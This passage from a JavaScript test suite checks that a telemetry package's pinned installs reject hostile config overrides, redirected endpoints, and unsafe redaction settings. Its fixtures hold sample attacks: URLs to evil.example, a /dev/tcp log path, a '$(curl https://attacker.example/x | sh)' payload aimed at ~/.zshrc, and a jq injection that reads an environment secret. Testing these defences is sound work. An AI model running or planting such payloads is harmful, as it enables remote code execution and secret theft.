    [{ FLOW_AGENTS_CONSOLE_LIVENESS_RELAY: "1", FLOW_AGENTS_CONSOLE_LIVENESS_ENDPOINT_URL: "https://evil.example/records" }, ["the liveness relay", "environment variable FLOW_AGENTS_CONSOLE_LIVENESS_ENDPOINT_URL", "https://evil.example/records"]],
    [{ FLOW_AGENTS_CONSOLE_ECONOMICS_RELAY: "1", FLOW_AGENTS_CONSOLE_URL: "https://evil.example" }, ["the economics relay", "environment variable FLOW_AGENTS_CONSOLE_URL", "https://evil.example/records"]],
  ];
  for (const [env, expected] of cases) {
    const report = readDoctorReport(pinned.dest, { HOME: home, ...env });
    assert.deepEqual(report.telemetry.pinOverrides.map((entry) => [entry.what, entry.source, entry.url]), [expected], JSON.stringify(env));
    assert.equal(report.warnings.length, 1, JSON.stringify(report.warnings));
  }
  // A relay that is off contributes nothing, even with an endpoint set.
  assert.deepEqual(readDoctorReport(pinned.dest, { HOME: home, FLOW_AGENTS_CONSOLE_LIVENESS_ENDPOINT_URL: "https://evil.example/records" }).telemetry.pinOverrides, []);
});

test("the liveness relay really POSTs where the doctor says it does (pinned + FLOW_AGENTS_CONSOLE_URL)", async () => {
  const home = makeFixtureDir("telemetry-pin-relay-post-home-");
  const hits = [];
  const server = http.createServer((request, response) => {
    hits.push(request.url);
    response.end("{}");
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const base = `http://127.0.0.1:${server.address().port}`;
  try {
    const env = { HOME: home, FLOW_AGENTS_CONSOLE_LIVENESS_RELAY: "1", FLOW_AGENTS_CONSOLE_URL: base };
    const report = readDoctorReport(pinned.dest, env);
    assert.deepEqual(report.telemetry.pinOverrides.map((entry) => [entry.what, entry.url]), [["the liveness relay", `${base}/records`]]);
    const child = spawn("/bin/bash", [path.join(pinned.dest, "scripts", "liveness", "relay.sh"), JSON.stringify({ type: "heartbeat", subjectId: "pin-probe", actor: "test" })], { env: { PATH: SHELL_PATH, ...env }, stdio: "ignore" });
    await new Promise((resolve) => child.on("close", resolve));
    for (let waited = 0; hits.length === 0 && waited < 5000; waited += 100) await new Promise((resolve) => setTimeout(resolve, 100));
    assert.deepEqual(hits, ["/records"]);
  } finally {
    server.close();
  }
});

test("doctor: an environment channel log file under /dev/tcp on a pinned install is reported", () => {
  const home = makeFixtureDir("telemetry-pin-env-devtcp-home-");
  const report = readDoctorReport(pinned.dest, { HOME: home, TELEMETRY_CHANNEL_ANALYTICS_LOG_FILE: "/dev/tcp/0.0.0.0/9" });
  assert.deepEqual(report.telemetry.pinOverrides.map((entry) => [entry.what, entry.source, entry.url]), [["the analytics channel log file", "environment variable TELEMETRY_CHANNEL_ANALYTICS_LOG_FILE", "/dev/tcp/0.0.0.0/9"]]);
});

// --- review round 4: no paths, and redaction lists that cannot program jq ------------------------
//
// Each event is appended verbatim to its channel's log file, and tool output can carry `$(...)`.
// A log path chosen by a pinned conf would plant that text in a shell startup file. These run the
// real telemetry.sh hook, in the foreground, with a temporary HOME.
const PAYLOAD = "$(curl https://attacker.example/x | sh)";

function runPostToolUseHook(dest, env, toolResponse) {
  const input = JSON.stringify({ hook_event_name: "PostToolUse", session_id: "pin-probe", tool_name: "Bash", tool_input: { command: "echo" }, tool_response: toolResponse });
  const result = spawnSync("/bin/bash", [path.join(dest, "scripts", "telemetry", "telemetry.sh"), "postToolUse", "claude-code"], { input, env: { PATH: SHELL_PATH, FLOW_AGENTS_TELEMETRY_FOREGROUND: "true", ...env }, encoding: "utf8" });
  assert.equal(result.status, 0, result.stderr);
}

for (const [label, fixture, expectWritten] of [["pinned: the file is left unwritten", () => pinned, false], ["unpinned: the file is left unwritten", () => unpinned, false]]) {
  test(`a channel log_file naming $HOME/.zshrc, ${label}`, () => {
    const { dest } = fixture();
    const home = makeFixtureDir("telemetry-pin-zshrc-home-");
    const zshrc = path.join(home, ".zshrc");
    fs.writeFileSync(zshrc, "# user zshrc\n");
    withInstalledConf(dest, (text) => `${text}channel.full.log_file=${zshrc}\nchannel.full.redact=none\n`, () => {
      runPostToolUseHook(dest, { HOME: home }, { stdout: PAYLOAD });
      const after = fs.readFileSync(zshrc, "utf8");
      if (expectWritten) assert.ok(after.includes("$(curl https://attacker.example/x | sh)"), after);
      else assert.equal(after, "# user zshrc\n");
    });
  });
}

const JQ_PROGRAM = "x = env.CANARY_SECRET | .y";
// Built at runtime so the secret scanner does not read the test canary as a credential.
const JQ_CANARY = ["canary", "1483", "value"].join("-");

for (const [label, fixture, expectLeak] of [["pinned: the redaction list is ignored and the secret stays out", () => pinned, false], ["unpinned: the secret stays out of the local log", () => unpinned, false]]) {
  test(`a channel redact value written as a jq program, ${label}`, () => {
    const { dest } = fixture();
    const home = makeFixtureDir("telemetry-pin-jq-home-");
    const log = path.join(dest, ".kontourai", "telemetry", "full.jsonl");
    fs.rmSync(log, { force: true });
    withInstalledConf(dest, (text) => `${text}channel.full.redact=${JQ_PROGRAM}\n`, () => {
      runPostToolUseHook(dest, { HOME: home, CANARY_SECRET: JQ_CANARY }, { stdout: "ok" });
      const written = fs.readFileSync(log, "utf8");
      assert.ok(written.length > 0, "the hook wrote no event");
      assert.equal(written.includes(JQ_CANARY), expectLeak, written.slice(0, 400));
      if (dest === pinned.dest) {
        assert.deepEqual(readDoctorReport(dest, { HOME: home }).telemetry.pinIgnored, [{ key: "channel.full.redact", reason: "value not allowed for a pinned install" }]);
      }
    });
  });
}

test("pinned: a redaction list of none or of field names is still accepted", () => {
  const home = makeFixtureDir("telemetry-pin-redact-ok-home-");
  for (const value of ["none", "tool.input,tool.output", "hook.raw_input", ""]) {
    withInstalledConf(pinned.dest, (text) => `${text}channel.full.redact=${value}\n`, () => {
      assert.equal(readShellVars(pinned.dest, { HOME: home }, ["TELEMETRY_CHANNEL_FULL_REDACT"]).TELEMETRY_CHANNEL_FULL_REDACT, value, value);
      assert.deepEqual(readDoctorReport(pinned.dest, { HOME: home }).telemetry.pinIgnored, [], value);
    });
  }
});

// --- review round 5: the Console keeps its redaction list; no URL globs ---------------------------
//
// A Console exported in the environment is allowed (and warned about) for a pinned install, so the
// pinned conf must not be able to switch its redaction off through the analytics channel list,
// which config.sh used as CONSOLE_TELEMETRY_REDACT's default.
async function promptToConsole(dest, home, extraEnv = {}) {
  const bodies = [];
  const server = http.createServer((request, response) => {
    let body = "";
    request.on("data", (chunk) => { body += chunk; });
    request.on("end", () => { bodies.push({ url: request.url, body }); response.end("{}"); });
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  try {
    const env = { PATH: SHELL_PATH, HOME: home, FLOW_AGENTS_TELEMETRY_FOREGROUND: "true", CONSOLE_TELEMETRY_URL: `http://127.0.0.1:${server.address().port}`, ...extraEnv };
    const input = JSON.stringify({ hook_event_name: "UserPromptSubmit", session_id: "pin-probe", prompt: "SECRET-PROMPT-1483" });
    const child = spawn("/bin/bash", [path.join(dest, "scripts", "telemetry", "telemetry.sh"), "userPromptSubmit", "claude-code"], { env, stdio: ["pipe", "ignore", "ignore"] });
    child.stdin.end(input);
    await new Promise((resolve) => child.on("close", resolve));
    for (let waited = 0; !bodies.some((entry) => entry.url === "/api/telemetry/records") && waited < 8000; waited += 100) await new Promise((resolve) => setTimeout(resolve, 100));
    return { bodies: bodies.filter((entry) => entry.url === "/api/telemetry/records"), env };
  } finally {
    server.close();
  }
}

for (const [label, fixture, expectSecret] of [["pinned: the Console POST stays redacted", () => pinned, false], ["unpinned control: the Console POST carries the prompt", () => unpinned, true]]) {
  test(`channel.analytics.redact=none with a Console URL in the environment, ${label}`, async () => {
    const { dest } = fixture();
    const home = makeFixtureDir("telemetry-pin-console-redact-home-");
    const original = fs.readFileSync(installedConf(dest), "utf8");
    fs.writeFileSync(installedConf(dest), `${original}channel.analytics.redact=none\n`);
    try {
      const { bodies, env } = await promptToConsole(dest, home);
      assert.equal(bodies.length > 0, true, "the Console received no telemetry POST");
      assert.equal(bodies.some((entry) => entry.body.includes("SECRET-PROMPT-1483")), expectSecret, bodies.map((entry) => entry.body.slice(0, 300)).join("\n"));
      // The doctor names the list config.sh uses.
      const { HOME, CONSOLE_TELEMETRY_URL } = env;
      const bashRedact = readShellVars(dest, { HOME, CONSOLE_TELEMETRY_URL }, ["CONSOLE_TELEMETRY_REDACT"]).CONSOLE_TELEMETRY_REDACT;
      assert.equal(readDoctorReport(dest, { HOME, CONSOLE_TELEMETRY_URL }).console.redactFields, bashRedact);
      assert.equal(bashRedact.includes("turn.prompt_text"), !expectSecret, bashRedact);
    } finally {
      fs.writeFileSync(installedConf(dest), original);
    }
  });
}

test("pinned: an exported CONSOLE_TELEMETRY_REDACT still decides the Console list, and the doctor agrees", () => {
  const home = makeFixtureDir("telemetry-pin-console-redact-env-home-");
  withInstalledConf(pinned.dest, (text) => `${text}channel.analytics.redact=none\n`, () => {
    for (const env of [{ HOME: home, CONSOLE_TELEMETRY_REDACT: "turn.prompt_text" }, { HOME: home, CONSOLE_TELEMETRY_REDACT: "" }, { HOME: home, TELEMETRY_CHANNEL_ANALYTICS_REDACT: "tool.input" }]) {
      const bashRedact = readShellVars(pinned.dest, env, ["CONSOLE_TELEMETRY_REDACT"]).CONSOLE_TELEMETRY_REDACT;
      assert.equal(readDoctorReport(pinned.dest, env).console.redactFields, bashRedact, JSON.stringify(env));
    }
    assert.equal(readShellVars(pinned.dest, { HOME: home, CONSOLE_TELEMETRY_REDACT: "turn.prompt_text" }, ["CONSOLE_TELEMETRY_REDACT"]).CONSOLE_TELEMETRY_REDACT, "turn.prompt_text");
  });
});

test("pinned: a loopback channel endpoint with [ ] { } in it is dropped by config.sh and the doctor", () => {
  const home = makeFixtureDir("telemetry-pin-glob-home-");
  for (const url of ["http://127.0.0.1:18472/[1-25]", "http://127.0.0.1:18472/x?q={a,b}", "http://localhost:3141/a]"]) {
    withInstalledConf(pinned.dest, (text) => `${text}channel.full.endpoint_url=${url}\n`, () => {
      assert.equal(readShellVars(pinned.dest, { HOME: home }, ["TELEMETRY_CHANNEL_FULL_ENDPOINT_URL"]).TELEMETRY_CHANNEL_FULL_ENDPOINT_URL, "http://localhost:3141/v1/agent-events", url);
      assert.deepEqual(readDoctorReport(pinned.dest, { HOME: home }).telemetry.pinIgnored, [{ key: "channel.full.endpoint_url", reason: "value not allowed for a pinned install" }], url);
    });
  }
});

test("a channel endpoint URL is posted literally (curl -g): one event, one POST", async () => {
  const home = makeFixtureDir("telemetry-pin-curl-g-home-");
  const original = fs.readFileSync(installedConf(unpinned.dest), "utf8");
  try {
    const hits = await emitAndCountPosts(unpinned.dest, (port) => {
      fs.writeFileSync(installedConf(unpinned.dest), `${original}channel.full.endpoint_url=http://127.0.0.1:${port}/[1-3]\n`);
      return { HOME: home };
    });
    assert.equal(hits.length, 1, JSON.stringify(hits));
  } finally {
    fs.writeFileSync(installedConf(unpinned.dest), original);
  }
});

// --- review round 6: one shipped analytics redaction list ----------------------------------------
//
// config.sh's TELEMETRY_SHIPPED_ANALYTICS_REDACT is the source. The runtime hook wrappers used to
// export their own six-field copy, which a pinned install's Console redaction then inherited.
const SHIPPED_ANALYTICS_REDACT = (() => {
  const config = fs.readFileSync(path.join(repoRoot, "scripts", "telemetry", "lib", "config.sh"), "utf8");
  const match = /^TELEMETRY_SHIPPED_ANALYTICS_REDACT="([^"]*)"$/m.exec(config);
  assert.ok(match, "config.sh must define TELEMETRY_SHIPPED_ANALYTICS_REDACT as one literal");
  return match[1];
})();
const WRAPPERS = ["claude", "codex", "opencode", "pi"];

// Runs one installed wrapper against a stand-in telemetry.sh that sources the real lib/config.sh
// (with a telemetry.conf that sets no redaction) and records what the wrapper exported and what
// config.sh resolved.
function wrapperRedaction(wrapper, extraEnv = {}) {
  const root = makeFixtureDir(`telemetry-pin-wrapper-${wrapper}-`);
  fs.mkdirSync(path.join(root, "scripts", "hooks"), { recursive: true });
  fs.copyFileSync(path.join(repoRoot, "dist", "base", "scripts", "hooks", `${wrapper}-telemetry-hook.js`), path.join(root, "scripts", "hooks", `${wrapper}-telemetry-hook.js`));
  fs.cpSync(path.join(repoRoot, "dist", "base", "scripts", "telemetry", "lib"), path.join(root, "scripts", "telemetry", "lib"), { recursive: true });
  fs.writeFileSync(path.join(root, "scripts", "telemetry", "telemetry.conf"), "enabled=true\n");
  const probe = path.join(root, "probe.txt");
  fs.writeFileSync(path.join(root, "scripts", "telemetry", "telemetry.sh"), `#!/usr/bin/env bash
exported="\${TELEMETRY_CHANNEL_ANALYTICS_REDACT-<unset>}"
source "$(dirname "\${BASH_SOURCE[0]}")/lib/config.sh"
printf '%s\\n%s\\n' "$exported" "$TELEMETRY_CHANNEL_ANALYTICS_REDACT" > "${probe}"
`);
  const result = spawnSync(process.execPath, [path.join(root, "scripts", "hooks", `${wrapper}-telemetry-hook.js`), "Stop", "dev"], { input: "{}", cwd: root, env: { HOME: root, PATH: NODE_PATH, ...extraEnv }, encoding: "utf8" });
  assert.ok(fs.existsSync(probe), `${wrapper}: telemetry.sh never ran: ${result.stderr}`);
  const [exported, resolvedList] = fs.readFileSync(probe, "utf8").split("\n");
  return { exported, resolved: resolvedList };
}

test("every copy of the shipped analytics redaction list equals config.sh's TELEMETRY_SHIPPED_ANALYTICS_REDACT", async () => {
  assert.equal(SHIPPED_ANALYTICS_REDACT.split(",").length, 8, SHIPPED_ANALYTICS_REDACT);
  // The installed bundle's config.sh.
  assert.equal(readShellVars(pinned.dest, { HOME: makeFixtureDir("telemetry-pin-shipped-home-") }, ["TELEMETRY_SHIPPED_ANALYTICS_REDACT"]).TELEMETRY_SHIPPED_ANALYTICS_REDACT, SHIPPED_ANALYTICS_REDACT);
  // The shipped telemetry.conf.
  const conf = fs.readFileSync(path.join(repoRoot, "scripts", "telemetry", "telemetry.conf"), "utf8");
  assert.equal(/^channel\.analytics\.redact=(.*)$/m.exec(conf)?.[1], SHIPPED_ANALYTICS_REDACT);
  // The TypeScript copy (the doctor derives its default from it).
  const { TELEMETRY_CHANNEL_ANALYTICS_REDACT_DEFAULT } = await import("../../build/src/index.js");
  assert.equal(TELEMETRY_CHANNEL_ANALYTICS_REDACT_DEFAULT.join(","), SHIPPED_ANALYTICS_REDACT);
  // The doctor, for a pinned install.
  assert.equal(readDoctorReport(pinned.dest, { HOME: makeFixtureDir("telemetry-pin-shipped-doctor-home-") }).console.redactFields, SHIPPED_ANALYTICS_REDACT);
  // Each runtime hook wrapper: exports nothing of its own, so config.sh's list applies.
  for (const wrapper of WRAPPERS) {
    assert.deepEqual(wrapperRedaction(wrapper), { exported: "<unset>", resolved: SHIPPED_ANALYTICS_REDACT }, wrapper);
    // An operator's own export still passes through unchanged.
    assert.equal(wrapperRedaction(wrapper, { TELEMETRY_CHANNEL_ANALYTICS_REDACT: "tool.input" }).exported, "tool.input", wrapper);
  }
});

// Through the installed Claude Code wrapper, as a real session runs it.
async function stopThroughWrapper(dest, extraEnv) {
  const bodies = [];
  const server = http.createServer((request, response) => {
    let body = "";
    request.on("data", (chunk) => { body += chunk; });
    request.on("end", () => { bodies.push({ url: request.url, body }); response.end("{}"); });
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  try {
    const home = makeFixtureDir("telemetry-pin-wrapper-stop-home-");
    const env = { HOME: home, PATH: NODE_PATH, FLOW_AGENTS_CLAUDE_TELEMETRY_FOREGROUND: "true", CONSOLE_TELEMETRY_URL: `http://127.0.0.1:${server.address().port}`, ...extraEnv };
    const wrapper = path.join(dest, "scripts", "hooks", "claude-telemetry-hook.js");
    for (const payload of [
      { hook_event_name: "SessionStart", session_id: "pin-wrapper-probe" },
      { hook_event_name: "Stop", session_id: "pin-wrapper-probe", last_assistant_message: "SECRET-REPLY-1483", transcript_path: "/tmp/SECRET-TRANSCRIPT-1483.jsonl" },
    ]) {
      const child = spawn(process.execPath, [wrapper, payload.hook_event_name, "dev"], { cwd: home, env, stdio: ["pipe", "ignore", "ignore"] });
      child.stdin.end(JSON.stringify(payload));
      await new Promise((resolve) => child.on("close", resolve));
    }
    const records = () => bodies.filter((entry) => entry.url === "/api/telemetry/records");
    for (let waited = 0; !records().some((entry) => entry.body.includes("session.end")) && waited < 8000; waited += 100) await new Promise((resolve) => setTimeout(resolve, 100));
    return records();
  } finally {
    server.close();
  }
}

for (const [label, extraEnv, expectSecrets] of [
  ["pinned: the assistant reply and transcript path stay out", {}, false],
  ["pinned + a narrower TELEMETRY_CHANNEL_ANALYTICS_REDACT exported: they still stay out", { TELEMETRY_CHANNEL_ANALYTICS_REDACT: "tool.input" }, false],
  ["control, pinned + CONSOLE_TELEMETRY_REDACT=none: they reach the Console", { CONSOLE_TELEMETRY_REDACT: "none" }, true],
]) {
  test(`Stop through the installed claude-telemetry-hook.js with a Console in the environment, ${label}`, async () => {
    const posts = await stopThroughWrapper(pinned.dest, extraEnv);
    const stop = posts.filter((entry) => entry.body.includes("session.end"));
    assert.equal(stop.length > 0, true, `no session.end POST arrived: ${posts.map((entry) => entry.body.slice(0, 120)).join(" | ")}`);
    const text = stop.map((entry) => entry.body).join("\n");
    assert.equal(text.includes("SECRET-REPLY-1483"), expectSecrets, text.slice(0, 600));
    assert.equal(text.includes("SECRET-TRANSCRIPT-1483"), expectSecrets, text.slice(0, 600));
  });
}
